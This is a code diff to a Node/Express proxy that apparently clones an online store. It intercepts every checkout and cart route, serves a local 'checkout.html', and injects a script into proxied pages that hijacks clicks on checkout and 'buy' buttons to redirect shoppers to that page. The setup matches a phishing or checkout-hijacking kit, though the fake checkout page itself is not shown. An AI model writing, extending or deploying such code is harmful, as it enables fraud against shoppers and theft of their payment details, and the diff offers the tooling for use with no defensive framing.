@@ -37,13 +37,40 @@ app.get('/index_files/*', (req, res, next) => {
   next();
 });
 
+// 🎯 ПЕРЕХВАТ CHECKOUT СТРАНИЦ
+app.get('/checkout*', (req, res) => {
+  console.log('🎯 Checkout intercepted:', req.url);
+  res.sendFile(__dirname + '/checkout.html');
+});
+
+app.get('/cart', (req, res) => {
+  console.log('🎯 Cart page intercepted:', req.url);
+  res.sendFile(__dirname + '/checkout.html');
+});
+
+// Перехватываем все возможные варианты checkout
+app.get('*checkout*', (req, res) => {
+  console.log('🎯 Checkout variant intercepted:', req.url);
+  res.sendFile(__dirname + '/checkout.html');
+});
+
 // Обработка POST запросов (возвращаем 200 для избежания ошибок)
 app.post('/api/*', (req, res) => {
   res.status(200).json({ success: true });
 });
 
 app.post('/cart/*', (req, res) => {
-  res.status(200).json({ success: true });
+  // Если это запрос на добавление в корзину, логируем и перенаправляем
+  if (req.url.includes('add') || req.url.includes('update')) {
+    console.log('🛒 Cart action intercepted:', req.url);
+    res.status(200).json({ 
+      success: true, 
+      redirect: '/checkout',
+      message: 'Redirecting to checkout...' 
+    });
+  } else {
+    res.status(200).json({ success: true });
+  }
 });
 
 app.post('/.well-known/*', (req, res) => {
@@ -82,6 +109,76 @@ const proxyOptions = {
     proxyRes.headers['Access-Control-Allow-Origin'] = '*';
     proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
     proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
+    
+    // Инжектируем скрипт перехвата checkout
+    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
+      let body = '';
+      proxyRes.on('data', (chunk) => {
+        body += chunk;
+      });
+      
+      proxyRes.on('end', () => {
+        // Добавляем скрипт перехвата перед закрывающим тегом </body>
+        const checkoutScript = `
+          <script>
+            // 🎯 CHECKOUT INTERCEPTOR
+            (function() {
+              console.log('🎯 Checkout Interceptor loaded');
+              
+              function interceptCheckoutClicks() {
+                document.addEventListener('click', function(event) {
+                  const target = event.target;
+                  const text = target.textContent?.toLowerCase() || '';
+                  const href = target.href || '';
+                  
+                  if (text.includes('checkout') || text.includes('купить') || 
+                      text.includes('оформить') || href.includes('checkout') ||
+                      target.classList.contains('checkout') || target.id.includes('checkout')) {
+                    console.log('🎯 Checkout button clicked:', target);
+                    event.preventDefault();
+                    event.stopPropagation();
+                    
+                    // Показываем уведомление
+                    const notification = document.createElement('div');
+                    notification.innerHTML = \`
+                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
+                        Перенаправляем на checkout...
+                      </div>
+                    \`;
+                    document.body.appendChild(notification);
+                    
+                    setTimeout(() => {
+                      window.location.href = '/checkout';
+                    }, 500);
+                    
+                    return false;
+                  }
+                });
+              }
+              
+              if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', interceptCheckoutClicks);
+              } else {
+                interceptCheckoutClicks();
+              }
+              
+              // Дополнительная проверка
+              setTimeout(interceptCheckoutClicks, 2000);
+            })();
+          </script>
+        `;
+        
+        // Вставляем скрипт перед </body>
+        const modifiedBody = body.replace('</body>', checkoutScript + '</body>');
+        
+        if (!res.headersSent) {
+          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
+          res.end(modifiedBody);
+        }
+      });
+      
+      return;
+    }
   },
   onError: (err, req, res) => {
     console.error('Proxy Error:', err.message);
